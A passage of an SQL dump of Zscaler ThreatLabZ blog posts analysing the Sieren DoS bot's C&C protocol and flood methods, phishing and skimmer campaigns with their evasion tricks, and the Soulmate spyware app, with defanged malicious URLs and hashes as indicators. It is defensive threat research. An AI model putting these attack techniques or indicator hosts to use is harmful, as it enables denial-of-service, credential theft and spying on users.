phishing, exploit kits and malware, porn, advertisements, and so on. This blog includes examples and analysis of the techniques in use. Read more.', '', 'https://www.zscaler.com/blogs/research/top-10-threatlabz-blogs-2018');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (11, 'Sieren: A new DoS bot', 'Rajdeepsinh Dodia', 'December 21, 2018', 'Zscaler ThreatLabZ recently discovered a new DoS family bot named Sieren. A denial-of-service (DoS) attack is a cyber-attack in which cybercriminals disrupt the service of a host connected to the internet, either temporarily or indefinitely, to its intended users. In this analysis, we\'ll describe Sieren\'s functionality and communication, its 10 DoS methods, its bot commands, and its IoCs.\r\n\r\nFunctionality\r\n\r\nSieren is capable of performing HTTP, HTTPS, and UDP flooding on any web server location as instructed by the command-and-control (C&C) server.\r\n\r\n\r\n	HTTP flood\r\n	HTTPS flood\r\n	UDP flood\r\n\r\n\r\nNetwork communication\r\n\r\nSieren starts communication with the server by sending system information.\r\n\r\n\r\n\r\nData is separated by the “&” symbol.\r\n\r\n\r\n	ping\r\n	User Name\r\n	Machine Name\r\n	OS version\r\n	Processor architecture (If 32 bit then 0 else 1)\r\n	MD5 of the above data\r\n\r\n\r\nIn response, the C&C server sends a target URL for performing a DoS attack. Data is separated by the “&” symbol.\r\n\r\n\r\n\r\n\r\n	pong\r\n	60: used for sleep (60 * 1000 millisecond)\r\n	Task_ID = 260\r\n	Method = 2\r\n	Target = https://deti-online.com/\r\n	Type = GET\r\n	Threads = 100\r\n	Sleep = 100\r\n	Port = 0\r\n	Sockets = 0 (number of sockets)\r\n	Size = 0 (size of data sent through packet during Dos)\r\n	CreatedAT = Timestamp\r\n	Data = Empty (data sent through packet during DoS)\r\n\r\n\r\nThe malware is capable of performing a DoS attack against the target URL using different methods. The variant we analyzed has 10 methods supported for flooding, and it chooses the method based on data received from the C&C server.\r\n\r\nIn the above instance, we saw that a Russian education material website (https://deti-online[.]com) was the intended target for this bot. We also identified other locations, such as forum.exlpoit[.]in and x3p0[.]xyz, as the DoS targets from the C&C server during our analysis.\r\n\r\nThe Sieren bot selects the DoS method based on data received from the C&C server. Below are the parameters used in these methods:\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n			Method\r\n			\r\n			\r\n			Task_ID\r\n			\r\n			\r\n			Target\r\n			\r\n			\r\n			Type(GET/POST)\r\n			\r\n			\r\n			No. of threads\r\n			\r\n			\r\n			Sleep\r\n			\r\n			\r\n			Data\r\n			\r\n			\r\n			No. of Sockets\r\n			\r\n			\r\n			Port\r\n			\r\n			\r\n			Size of data\r\n			\r\n		\r\n		\r\n			\r\n			1\r\n			\r\n			\r\n			Yes\r\n			\r\n			\r\n			Yes\r\n			\r\n			\r\n			Yes\r\n			\r\n			\r\n			Yes\r\n			\r\n			\r\n			Yes\r\n			\r\n			 \r\n			 \r\n			 \r\n			 \r\n		\r\n		\r\n			\r\n			2\r\n			\r\n			\r\n			Yes\r\n			\r\n			\r\n			Yes\r\n			\r\n			\r\n			Yes\r\n			\r\n			 \r\n			\r\n			Yes\r\n			\r\n			 \r\n			 \r\n			 \r\n			 \r\n		\r\n		\r\n			\r\n			3\r\n			\r\n			\r\n			Yes\r\n			\r\n			\r\n			Yes\r\n			\r\n			\r\n			Yes\r\n			\r\n			 \r\n			 \r\n			 \r\n			 \r\n			 \r\n			 \r\n		\r\n		\r\n			\r\n			4\r\n			\r\n			\r\n			Yes\r\n			\r\n			\r\n			Yes\r\n			\r\n			 \r\n			 \r\n			\r\n			Yes\r\n			\r\n			\r\n			Yes\r\n			\r\n			 \r\n			 \r\n			 \r\n		\r\n		\r\n			\r\n			5\r\n			\r\n			\r\n			Yes\r\n			\r\n			\r\n			Yes\r\n			\r\n			 \r\n			 \r\n			\r\n			Yes\r\n			\r\n			 \r\n			 \r\n			 \r\n			 \r\n		\r\n		\r\n			\r\n			6\r\n			\r\n			\r\n			Yes\r\n			\r\n			\r\n			Yes\r\n			\r\n			 \r\n			 \r\n			 \r\n			 \r\n			\r\n			Yes\r\n			\r\n			\r\n			Yes\r\n			\r\n			 \r\n		\r\n		\r\n			\r\n			7\r\n			\r\n			\r\n			Yes\r\n			\r\n			\r\n			Yes\r\n			\r\n			 \r\n			 \r\n			 \r\n			 \r\n			\r\n			Yes\r\n			\r\n			\r\n			Yes\r\n			\r\n			 \r\n		\r\n		\r\n			\r\n			8\r\n			\r\n			\r\n			Yes\r\n			\r\n			\r\n			Yes\r\n			\r\n			 \r\n			 \r\n			 \r\n			 \r\n			\r\n			Yes\r\n			\r\n			\r\n			Yes\r\n			\r\n			\r\n			Yes\r\n			\r\n		\r\n		\r\n			\r\n			9\r\n			\r\n			\r\n			Yes\r\n			\r\n			\r\n			Yes\r\n			\r\n			 \r\n			 \r\n			 \r\n			 \r\n			 \r\n			\r\n			Yes\r\n			\r\n			\r\n			Yes\r\n			\r\n		\r\n		\r\n			\r\n			10\r\n			\r\n			\r\n			Yes\r\n			\r\n			\r\n			Yes\r\n			\r\n			 \r\n			 \r\n			 \r\n			 \r\n			 \r\n			\r\n			Yes\r\n			\r\n			\r\n			Yes\r\n			\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nThe C&C server can specify the port, data, sleep time, sockets, and size of packets that will be used during flooding.\r\n\r\nDuring flooding, a user agent is selected randomly from a predefined list, as shown below.\r\n\r\n\r\n\r\nDoS methods supported by Sieren\r\n\r\nMethod 1:\r\n\r\nIn this method, the malware first gets the cookies for the target URL using InternetGetCookieEx and uses them in the HTTP header when generating flood requests. Based on the protocol (HTTP/HTTPS) and method (POST/GET), it starts sending multiple requests to the target URL.\r\n\r\nThe below screenshot contains code for generating the header part.\r\n\r\n\r\n\r\nThe below screenshot contains the HTTP flooding code:\r\n\r\n\r\n\r\nThe below screenshot contains the HTTPS flooding code:\r\n\r\n\r\n\r\nMethod 2:\r\n\r\nThe malware creates 50 sockets and sends 50 HTTP requests before executing a sleep command with the value supplied by the C&C server. It will repeat this process until taskID is active.\r\n\r\nMethod 3:\r\n\r\nThis method is similar to method 2, but the bot won’t sleep after every 50 requests.\r\n\r\nMethod 4:\r\n\r\nIn this method, the bot will use data supplied by the C&C server in the flood requests to the target URL.\r\n\r\nMethod 5:\r\n\r\nIn this method, the bot will also accept a response during the flooding of the target URL, after which it will sleep for 100 seconds. Then it again starts sending flood requests to the target URL.\r\n\r\nMethod 6:\r\n\r\nThis method is called when the number of sockets and port is specified by the C&C server. In this method, the bot will not send HTTP or HTTPS flood requests; instead, it opens multiple sockets for the target URL in an attempt to exhaust web server-side resources. It repeatedly closes and opens additional sockets to the target URL until taskID remains active.\r\n\r\n\r\n\r\nMethod 7:\r\n\r\nThis method is identical to Method 6 and appears to be a placeholder for a future update.\r\n\r\nMethod 8:\r\n\r\nIn this method, the bot will receive arguments such as the size of random data, number of sockets, and port information from the C&C server. The bot will generate random data based on specified size, open multiple sockets, and flood the target URL with the randomly generated data.\r\n\r\nMethod 9:\r\n\r\nIn this method, the C&C server will supply the size of random data and port information. The bot will generate random data and flood the target URL on the specified port.\r\n\r\nMethod 10:\r\n\r\nThis method is used for UDP-based flooding. The bot will send random data using the UDP protocol, and it sets the TTL (time to live) value between 220 and 225 for these packets.\r\n\r\n\r\n\r\nThe bot will stop performing flood requests once the C&C server stops sending additional commands.\r\n\r\nSieren bot commands:\r\n\r\nOther than the DoS feature-related methods, the malware has three additional commands.\r\n\r\n\r\n	“dlexec”: Download payload from the URL given by the C&C server and execute it.\r\n	“update”: Download the updated version and execute it. It also deletes itself using the cmd process.\r\n	“Uninstall”: Deletes itself using the cmd process.\r\n\r\n\r\nIndicators of Compromise:\r\n\r\nMD5\r\n\r\n320A600147693B3D135ED453FAC42E82\r\n\r\nURL\r\n\r\ncx93835[.]tmweb.ru/rrljw91zqd.exe\r\n\r\nburgerkingfanbase[.]net/great.php', '', 'http://www.zscaler.com/blogs/research/sieren-new-dos-bot');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (12, '2019 Will See Cybercriminals Eye Opportunities in Cryptocurrency and IoT to Launch Their Attacks', 'Deepen Desai', 'December 13, 2018', 'Cybercriminals never take vacations. They’re always scanning the horizon to see which new technologies are being adopted by legitimate enterprises and are therefore ripe to be exploited, or how to utilize trusted protocols to steal credentials of unsuspecting consumers. The coming year will be no different, but the tools in some cases will change. Here are my predictions for the cybercrime trends that will get our attention in 2019.    Prediction #1: Malware operators will cash in on cryptocurrency    We’ll continue to see more and more malware operators make money on cryptocurrency, either by mining coins using infected systems or by stealing cryptocurrency from the infected systems. This will involve new and existing malware strains that will add cryptomining and stealing functionality. The three most common types of crypto-malware include cryptominers, wallet stealers, and clipboard hijackers, and we expect to see an increase in all three types. Here’s how they work:    When downloaded, cryptominer malware works in the background to steal CPU cycles that can mine and generate digital currency like bitcoins without users’ knowledge or consent. By spreading their malware across thousands of machines, the miners form a mining pool that can result in big payoffs for the malware author. In 2018, cryptomining surpassed ransomware to become one of the top threats, and that trend is expected to continue.    Wallet stealing will increase, too, in both frequency and sophistication. Wallets don’t store the cryptocurrencies; instead, they store credentials to access or spend the money, which is stored in blockchain. Expect to see new variants that contain the functionality to locate and steal wallet.dat files.    Clipboard hijacking is another recent innovation. Because cryptocurrency wallet addresses are long, random-looking sequences of alphanumeric characters, they are difficult to remember. Almost all cryptocurrency owners copy and paste their wallet address for making transactions; on an infected system, malware can monitor for cryptocurrency transactions and dynamically change the wallet address on the clipboard to that of the malware operator so that future transactions benefit the malware operator.    Prediction #2: SSL/TLS-delivered threats will become more common    We’ve seen steady growth in overall SSL/TLS-encrypted traffic this year, which now accounts for almost 75 percent of total enterprise traffic going through the Zscaler cloud. Cybercriminals are leveraging this encrypted channel at all stages of the cyber kill chain. In particular, there has been a sharp increase in phishing attacks and malware payload delivery over encrypted channels. In the latter half of 2018 alone, we saw that 35 percent of phishing content was delivered over encrypted channels, representing a 300 percent increase since 2016.    Though the volume of SSL/TLS-encrypted traffic has risen sharply, much of it is going uninspected, either because it’s assumed to come from trusted sources or, more likely, because of the impact inspection would have on network performance. Attackers can now hide malware in encrypted traffic knowing it is not likely to be inspected.    In 2019, we will continue to see SSL/TLS utilized by cybercriminals to launch attacks, and we anticipate an increase in phishing attacks and malware payload deliveries over these channels, as cybercriminals take advantage of the assumed trust in encryption as well as the ease with which they can obtain digital certificates.    Prediction #3: IoT threats will have a greater impact on enterprises    IoT footprints in the enterprise network have grown rapidly over the past few years, and these internet-connected devices can pose significant risks to enterprise networks. We will continue to see cybercriminals leverage IoT devices as a beachhead to large-scale attacks against enterprise networks.    Some of the largest attacks on record are the result of hackers using IoT devices to carry out massive distributed-denial-of-service (DDoS) attacks (you can read about some of them here and here). IoT devices have notoriously poor security with known default passwords that are rarely ever changed, and manufacturers are slow to patch vulnerabilities.    In addition to employee-owned devices coming into the workplace, organizations are adding hundreds or even thousands of IoT devices to their environments, such as cameras, printers, IP phones, televisions, kitchen appliances, thermostats, and more. Besides the potential for DDoS attacks, IoT vulnerabilities are being used by attackers as an entry point to a network, in which they can hop from one vulnerable device to the next, undetected.    One an attacker gains a toehold into a network through a compromised device, it can be used for spreading malware, stealing credentials, leaking data, and sniffing traffic. Unfortunately, until manufacturers take the threat seriously and bake security into their devices, the attacks will continue to rise in 2019 and beyond.    The US-CERT (United States Computer Emergency Readiness Team) has provided security tips for IoT devices here.    Prediction #4: Supply-chain attacks will grow    There has been a steady increase in software supply-chain attacks in recent years. These attacks used to be targeted in nature, singling out a specific industry or organization, such as government. However, we’re seeing software supply-chain attacks used for commodity malware as well, which has the potential to impact larger numbers of users. We will see cybercriminals continue to focus on attacking critical software supply-chain infrastructure to conduct larger attacks.    An example of the fast and massive damage that a software supply-chain attack can inflict is the June 2017 NotPetya attack. The initial infection was through an accounting software website and, by the end, it had wiped data from many thousands of computers around the world at banks, energy firms, governments, and more. Not only is a company’s valuable data and IP at risk, so too is their reputation—which in the end hits its bottom line. NotPetya appeared to be a state-sponsored attack, but most supply-chain attacks are the result of poor security hygiene, which attackers are always prepared to exploit.    Prediction #5: Criminals will turn their attention to cloud service providers    The increase in cloud adoption has shifted a lot of workflows to the cloud. With that shift, we’ll see more attacks aimed at infiltrating cloud service providers in an attempt to gain access to valuable data from the organizations using the cloud services. These attacks may have a far-reaching impact, in light of the volume of data companies are storing in public clouds, and they can pose severe financial consequences.     The cloud service providers themselves have invested heavily in security protections and have large security teams to ensure their systems are sound—they are far more secure than the typical enterprise data center. But most cloud services and their configurations are new and evolving, and mistakes, such as the widely publicized S3 bucket misconfigurations, have led to the exposure of sensitive data at many organizations. But the most common source of errors leading to data leaks or the spread of malware is the end-user. While your cloud storage system may be impenetrable, there is always the risk that employees will be careless with their credentials, enabling bad actors to access your valuable data. In 2019, we expect to see an increase in social engineering attacks aimed specifically at employees accessing cloud applications.', '', 'https://www.zscaler.com/blogs/research/2019-will-see-cybercriminals-eye-opportunities-cryptocurrency-and-iot-launch-their-attacks');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (13, 'Cyber Monday: The biggest day for cyberattacks? Not by a long shot.', 'Deepen Desai', 'December 04, 2018', 'Last week, the Zscaler ThreatLabZ research team did an analysis of phishing attacks we’ve come across in our cloud leading up to Black Friday and Cyber Monday. The team had been seeing an increase in a variety of phishing activities, with targeted attacks and faked login pages designed to steal the credentials of unsuspecting shoppers. (You can read their informative report here.)    With Black Friday and Cyber Monday behind us, we decided to take another look at the data to determine the volume of shopping activity across our cloud and the expected rise in threat activity that coincides with major online events.    What we found was that Cyber Monday was, indeed, the biggest shopping day of the year on our cloud and elsewhere. According to the National Retail Federation, 50 million people shopped online in the U.S. alone. Amazon reported that Cyber Monday was its biggest shopping day in history, and over the five days from Thanksgiving through Monday, Amazon customers bought more than 180 million items.    What we saw more than a billion times    We can attest to the high volume of shopping activity. On Cyber Monday, the Zscaler cloud processed 1.35 billion internet requests on shopping sites, with the highest volume by far on Amazon, at 372,824,847 requests. While Monday’s shopping traffic only represented 2.18 percent of traffic overall on our cloud, it was 72 percent higher than shopping traffic on a typical day.    Cyber Monday top five shopping sites on the Zscaler cloud:        Number of requests we processed on Cyber Monday\'s top shopping sites.    With so much shopping activity, you might think that Black Friday and Cyber Monday would be the days that cybercriminals would crank up the volume, launching phishing attacks and spreading malware to online shoppers. But the traffic patterns on our cloud show otherwise.    Phishing attacks are planned and executed with precision    On Cyber Monday, we blocked a total of 2,337,537 phishing attempts. That’s significant, but that number was actually down from the days before Black Friday, and this decrease is consistent with patterns we’ve seen. Attacks peak in the days leading up to major events or shopping days. Attackers plan their phishing campaigns for the days when potential victims are looking for deals, aligning their attacks with mainstream advertising campaigns. On the “big day,” when shoppers have already decided what sites to visit, the attacks drop off accordingly.    On the three days before Thanksgiving, we blocked the highest numbers of phishing attempts, with a peak of 4.4 million on Wednesday. By Black Friday, attacks had dropped by nearly 30% from the high. They continued to decrease in volume through Monday when attacks were down 46% from Wednesday.    November graph shows daily phishing attempts on the Zscaler cloud    Why did attacks drop on Cyber Monday?    It’s been a long time since hackers could be stereotyped as nerds in the basement using their programming skills to bootleg videos. Today’s criminals are sophisticated in their technical execution and in their understanding of market drivers and user behavior. They operate their campaigns like big businesses—because they are. They know when you’re most likely to be online and when you’ll be sifting through the most email (Monday is the most popular day for phishing attacks). They know you’re more likely to open tracking slips or invoices than an unknown attachment. And they exploit the trust you have in brands like Amazon, Kohl’s, Bank of America, and many others, by creating fake websites that look just like the real thing.    Consumers must change their online behavior accordingly, approaching each online interaction with an awareness of its potential risk. You can’t assume that attachments are safe, even if you recognize the name of the sender; spoofing names is practically effortless. You can’t assume that text messages are safe either, due to the rise in SMS phishing. So-called “SMiShing” links can take you to compromised websites, just as infected email attachments can. E-commerce websites can be compromised in a variety of ways. Hackers can inject JavaScript into a site and the script sends data collected in the input fields to the hacker’s remote server. A favorite tactic is creating sites that look like legitimate sites but are designed to steal your personal information.    Can you tell the difference between these two Amazon login screens?        The screen on the left is a login for a phishing site that will collect your personal information, including credit card number, and you’ll think you’re on the Amazon site the whole time. The one on the right is a real Amazon login screen. The only difference is in the address bar. Be sure the site you are on matches the URL address.     We also know, as we stated earlier, that today’s cybercriminals plan their campaigns with a marketer’s precision. It’s wise to take extra precautions leading up to and during big events or news days (another day in November when we saw a surge in phishing activity was the sixth, the U.S. election day).    Three things you can do right now to protect yourself from phishing:      	Check the authenticity of the URL or website address before clicking on a link; make sure the address matches the site you\'re visiting  	Ensure online retailers and banking sites use secure connections; the URL should start with HTTPS  	Inspect the source of emails with enticing shopping deals; be wary of all links and attachments      More resources:    Read the ThreatLabZ Phishing Roundup blog for an analysis of current phishing trends    Download the infographic:', '', 'https://www.zscaler.com/blogs/research/cyber-monday-biggest-day-cyberattacks-not-long-shot');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (14, 'Black Friday & Cyber Monday Deals: Phishing and Site Skimmers', 'Chris Mannon', 'November 21, 2018', 'It’s that time of year again! The most glorious of shopping seasons has arrived, and users have commenced their annual tradition of flooding e-stores in search of the best deals that their money can buy. Threat actors, keen to take advantage of increased seasonal shopping activity, are deploying targeted phishing campaigns and site skimmers in the hopes of cashing in. The spectrum of attacks is reaching users in nearly all aspects of their online presence. Email, tweets, and websites are all vehicles of abuse. Zscaler has seen a steady rise in phishing attacks leading up to Black Friday and Cyber Monday, and we\'ll provide an overview of them here.        Fig. 1: Malicious activities from mid-October through mid-November. The turquoise bars represent targeted phishing attacks.    Targeted phishing    Examining one of the targeted phishing campaigns illustrates the need for caution when shopping online. The faked Amazon screen provides the perfect example, because Amazon is probably the most prolific online shopping site used during the holidays. Aside from the address bar, it\'s a relatively good knock-off.        Fig. 2: Faked Amazon sign-in form.    This attack doesn’t stop at compromising your Amazon credentials. This site also wants your credit card information!        Fig. 3: Faked Amazon billing page.    A closer look at this attack shows that the attackers don’t even have the decency to encrypt your stolen credentials.        Fig. 4: Wireshark exposes the packets moving between client and server over HTTP.    The best defense is to always be conscious of the address bar. A store like Amazon is never going to ask you for sensitive information away from the Amazon site.    Site skimmers    Other sophisticated attacks that have proven to be even more insidious are site skimmers like MageCart. MageCart refers to a hacker group that is responsible for large-scale attacks on e-commerce sites. MageCart will compromise a well-known or trusted site and inject malicious, obfuscated JavaScript that can tap into purchases. The injected script will add a form to the payment page at runtime using Document Object Model (DOM) properties. Information skimmed from this attack can include all the personal information requested by the compromised e-commerce page.    More information about this type of attack is detailed in another blog. Despite several security vendors taking notice, users are still being impacted daily. An updated chart on MageCart hits since our September 28 blog shows that this advanced attack is not stopping anytime soon.        Fig. 5: MageCart activity between September 20 and November 15.    The best defense against this threat is to have a malware detection tool that is inline with the browser. These tools have the best chance of detecting the malicious JavaScript code on an online store\'s page.    Cryptocurrency Mining    The final attack we\'ll review is the use of cryptojacking. Unlike the other attacks discussed, cryptojacking does not target the user\'s sensitive information but rather their system resources. A small piece of javascript can be injected into a page which will leverage the user\'s browser processes to mine cryptocurrency for the attacker. Attackers will leverage user susceptibility to the shopping season to bolster their cryptowallets.        Fig. 6: An online shopping aggregator linking to Amazon, but redirecting user\'s to mine Monero Cryptocurrency    Behind the scenes of this shopping site, lies a small piece of javascript that redirects the user\'s system resources to mine cryptocurrency through the application, CoinHive.        Fig. 7: Coinhive injection script will use the user\'s system resources to mine the cryptocurrency, Monero.    The best defense against this kind of attack is to use javascript blocking browser applications like ScriptSafe or NoScript to toggle what sites may execute javascript.     Conclusion    The ThreatLabZ team at Zscaler works diligently to ensure that customers do not fall victim to malicious activities described above. Users should be cautious and protect themselves by reviewing our security checklist, particularly during the shopping season:      	Check the authenticity of the URL or website address before clicking on a link  	Ensure online retailers and banking sites use HTTPS/secure connections  	Do not use unsecured public Wi-Fi for shopping  	Inspect the source of emails with enticing shopping deals; be wary of any suspicious attachments  	Steer clear of unofficial mobile application stores  	Use two-factor authentication whenever possible, especially on sensitive accounts such as those used for banking  	Always ensure that your operating system and web browser are up to date and have the latest security patches installed  	Use browser add-ons like Adblock Plus to block popups and potential malvertisements  	Use browser add-ons like No Coin to block a site\'s attempts to use your computer for cryptocurrency mining  	Back up your documents and media files  	Review the Identity Theft Guide and FAQs from the Federal Trade Commission  	Review the  National Cybersecurity and Communications Integration Center\'s (NCCIC) Holiday Scams and Malware Campaigns warning and recovery actions message      Wishing you all a very happy, healthy, and safe Thanksgiving!    Zscaler™, Zscaler Internet Access™, Zscaler Private Access™, ZIA™ and ZPA™ are either (i) registered trademarks or service marks or (ii) trademarks or service marks of Zscaler, Inc. in the United States and/or other countries. Any other trademarks are the property of their respective owners.', 'Abuse;Compromise;Encryption;Evasion/Stealth;Exploit;Malware;Mobile;Mobile Malware;Obfuscation;Phishing;Scam', 'https://www.zscaler.com/blogs/research/black-friday-cyber-monday-deals-phishing-and-site-skimmers');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (15, 'Zscaler ThreatLabZ Phishing Roundup', 'Deepen Desai,', 'November 20, 2018', 'Phishing is an attempt to steal personally identifiable information, such as Social Security numbers, credit card details, date of birth, and other sensitive data. Typically, phishing targets a user with an email containing a link to a website that imitates a legitimate website the user might visit. As users have become savvier about their online practices, the developers of phishing sites have upped their game, too, and many of the sites we see are carefully designed to look like the sites they’re imitating, and clever tactics are used to trick potential victims.    In this blog, we will share some insights from phishing activities blocked across the Zscaler™ cloud. We’ll cover the top brands and categories we are seeing targeted by phishing campaigns, recent examples of campaigns, and some of the tactics being used by threat actors to be more successful.    Types of phishing    There are different types of phishing activity, including:    Spear phishing, in which the phishing attempt is targeted against certain organizations or individuals working for specific companies.    SMiShing, also known as SMS phishing, which involves a message (SMS communication) that targets victims and entices them to click on URLs hosting phishing websites.    Whaling, in which threat actors target high-profile individuals, such as senior executives in a company, most often to gain internal company information that is not public knowledge.    What brands are being targeted?    While it might be easier to spoof the sites of lesser-known brands, where differences wouldn’t be so apparent, the actors trying to steal personal information need to impersonate popular sites for maximum return, raising the odds of snaring a victim. Their phishing sites often feature the biggest brands, and they use a variety of tricks to evade detection, which we’ll describe in this report. Some of the most commonly targeted brands we’ve seen in the recent phishing campaigns can be seen below:        Fig. 1: Top phished brands in the Zscaler Cloud    Microsoft tops the list partly because of Microsoft’s multiple enterprise web properties, such as OneDrive, Office 365, Outlook Web Access, among others, being targeted by the threat actors. Microsoft was followed by Facebook and PayPal in the list. In addition to the known brands, it was interesting to see phishing campaigns targeting Travel Visa portals (Canadian Visa and Australian Visa, for example) included in our top five most targeted brands. The attackers in this case were most likely interested in phishing for sensitive immigration information, such as passport details, date of birth and national identification numbers.    The top five most commonly targeted application categories we saw in the recent phishing campaigns include:    Communications (41.4%)    Social media (18.3%)    Finance (16.7%)    Travel (12.4%)    Dating (3.4%)         Fig. 2: Top phished site categories in the Zscaler Cloud    Delivery of phishing content    The majority of the phishing campaigns start with an email or message containing a link to a site hosting the phishing page. If the user clicks on the link, the phishing page is delivered. We have seen an increasing number of phishing attempts being delivered over an encrypted channel (HTTPS) -. We believe this increase is most likely due to the availability of domain validated (DV) SSL certificates. These certificates are easy to obtain from free SSL cert providers like Lets Encrypt as well as commercial Certificate Authorities. Multiple commercial CAs also offer free DV SSL certs with shorter validity periods with the expectation that the client will purchase a paid certificate once those expire. However, these offers provide a safe haven for cybercriminals who often leverage these short-term certs to deliver malicious content and then discard them.    About 65 percent of all phishing content we’ve seen in the past three months was over HTTP and the remaining 35 percent was over HTTPS. This represents a 300 percent increase in phishing content being delivered over HTTPS since 2016.    A look at recent phishing examples:    Chalbhai campaign    We continue to see a known phishing campaign using the tag chalbhai in its form statements. This campaign has been targeting users with phishing pages that mimic American Express, Microsoft Office, and Adobe, seasonal campaigns like fake IRS and TurboTax webpages during tax season and more recently holiday shopping season pages. A sample of this tag being used on a Wells Fargo phishing page is shown below.        Fig. 3: Chalbhai tag shown in the source code    Usage of compromised sites    Below is an example of a legitimate site that is compromised and the attacker has hosted multiple phishing sites on the compromised domain. The screenshot shows the open directory found on the compromised web server.        Fig. 4: Compromised web server    The two screenshots that follow are phishing pages designed to look like pages of legitimate websites, including a single sign-on page for Abilene Christian University and a Bank of America page.        Fig. 5: Faked SSO for Abilene Christian University        Fig. 6: Faked Bank of America page    If the user falls for these phishing pages, the credentials are harvested and posted to the attacker controlled location.    Evasion and Anti-Analysis Techniques    1. Use of images instead of content    The phishing websites are usually cloned copies of the legitimate sites. The difference in the case of Bank of America is that the faked page is almost entirely made up of a single image with a simple credential login form. This helps to evade engines running heuristics on the page source code.    2. Preventing access to page source    A simple anti-analysis technique used by scammers is disabling the right click functionality to prevent users from checking the page source. This can be seen in the phishing page below, which is pretending to be an Adobe Online document.        Fig. 7: Malicious Adobe Online document     3. Filtering based on User IP address, Host Names, and User Agent strings involved in the request    We’ve also observed malicious actors trying to fingerprint and serve phishing content based on the user’s IP address, host names, and user agents. We can see an example in the snippet below where the attacker is maintaining a list of IP addresses, hostnames and User-Agent strings known to be used by security researchers and analysts while attempting to get the phishing. If any request to the phishing site arrives from one of the known IP addresses or hostnames, or has one of the listed User-Agent strings then the phishing page will not be served. This tactic helps the attacker to keep the phishing page content undetected for a longer duration.        Fig. 8: Banned source IP addresses, hostnames and User-Agent strings    4. Exfiltrating information as an image instead of content    We have also seen multiple instances of phishing attacks that prompt users to verify their identity by asking them to upload a copy of their ID, as shown in the code below.         Fig. 9: Coded to prompt users to upload identification card    The sensitive user information in this case is being stolen in the form of an image which will bypass content based data loss prevention engines.    5. Encrypted Phishing    We have also seen a few phishing pages that use encryption to hide the source code in an attempt to evade detection by security engines. One such example, for a faked PayPal page, is shown below.        Fig. 10: Encrypted source code for a phishing page    6. Punycode based hostnames    We have also seen attempts to use punycode, in which threat actors use homograph techniques to construct a URL that looks like a legitimate URL, but uses characters in non-English language character sets to trick the user. (See our Punycode blog for examples of this technique.). This technique makes it difficult for reputation based engines to keep up.    Anatomy of Scam Page creation    Let’s now take a look at how typical scam web pages are created to perform financial fraud and phish for sensitive information. Attackers copy website templates to create scam websites making the scam pages look very similar to the original as seen below:        Fig. 11: Scam websites are built using templates to mimic legitimate sites    Most of the time, the fakes would include small changes to evade detection, like changing the names of the doctors on the following page but the site is identical otherwise.        Fig. 12: Small changes that help attackers evade detection    The scam websites even have live chat support, which responds to queries and guides users through the payment process. The photos of doctors were taken from a royalty-free stock photography database. When checking the source code in the Fig 11 example, we found that the contents were copied from a legitimate site, santabarbaraherbclinic[.]com, and we can see the timestamp in the screenshot below.        Fig. 13: Source code in scam website shows copied content from a legitimate site    Conclusion    Phishing attacks have been on the rise over the past few years. As the end users become more vigilant against clicking suspicious links, attackers have also upped the ante by evolving the way in which the phishing content is being delivered as well as tactics being leveraged to make the phishing pages stay undetected for longer period.    While in this blog we focused mainly on commodity phishing and scam pages, some of the tactics mentioned here are also commonly seen in many of the targeted phishing campaigns (Spearphishing, Business Email Compromise, etc). ZscalerTM ThreatlabZ actively tracks and ensures coverage against phishing campaigns.', 'Phishing', 'https://www.zscaler.com/blogs/research/zscaler-threatlabz-phishing-roundup');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (16, 'Soulmate: A Dating App That Spies On You', 'Shivang Desai', 'October 31, 2018', 'During a recent hunt for malware, the Zscaler™ ThreatLabZ team came across a piece of spyware disguised as an Android app and hosted on Google Play, Google’s official Android app store. The app portrays itself as partner matching app called Soulmate, designed to help you find (and keep tabs on) your True Love.     But the app has capabilities beyond those described by the developer, like snooping on incoming and outgoing calls, intercepting SMS messages, stealing contacts, tracing current and last-known location, and more.          	  		  			  		  		  			Fig 1: Soulmate app on Google Play   		  	           Zscaler notified Google about the presence of this app and it was immediately taken down from Google Play.         App Details    Name : Soulmate   Package Name : com.kikde.soulmate  Hash : 28be1a661e375547df52e7b544c2745b  Size : 8.6M  Installs : 50+  Offered By : Kikde App         Detailed Information     As soon as the app is started, it greets the user with a splash screen and some basic setup activities. It also asks to register itself as default keyboard. By doing so, it can log every keystroke entered by the user.          	  		  			  		  		  			Fig 2: Initial activities  		  	           During our analysis, we received a 404 error from the app’s command and control (C&C), which may have been a ploy or may have simply meant that the services were not available at the time of analysis. We decided to look further and found several permissions being asked that did not align with the name or purported function of the app. The screenshot below shows the list of permissions asked by the app.         	  		  			  		  		  			Fig 3: Android permissions  		  	           Once the setup was done, the app registered and started some services and broadcast receivers. Android services are components that can run in the background without user interaction, and the Android BroadcastReceiver is a component that can be made to trigger when certain system events occur, such as presenting an alert when the battery is low.    This spyware registers a broadcast receiver named ReciverHandler. This receiver is registered to execute upon following events:       	Outgoing Call  	Connectivity Change  	Change of Phone State  	Package Added/Removed/Installed   	Power Disconnect/Connect  	SMS Received  	SMS Sent  	Boot  	Screen ON/OFF      Depending upon which of the above events occurs, the spyware is designed to trigger particular services. We found that this app used the following Android services:       	Call Record Service  	Record Service  	Geofence Service  	App location Service  	MyKeyboard Service  	Clipboard Monitor Service  	Basic Info Upload Service  	File Upload Service   	Upload Service       Call Record Service and Record Service are responsible for recording the victim’s calls. The screenshot below shows this functionality.         	  		  			  		  		  			Fig 4:  Call recording  		  	           Geofence Service and AppLocation Service are responsible for fetching the victim\'s location. A snippet from the service can be seen below:         	  		  			  		  		  			Fig 5: Location tracing  		  	           Clipboard Service is responsible for stealing everything that is copied/pasted by the victim. The app creates a file named clipboard.txt in which the app stores all copied data. Copied data is also uploaded to the server, as shown in the following screenshot.         	  		  			  		  		  			Fig 6: Clipboard service   		  	           The app also tries to steal the victim\'s SMS messages as shown below:            	  		  			  		  		  			Fig 7: SMS stealing  		  	           Once every detail is collected, the data is saved in database locally and then sent to the C&C. These functions are achieved with the 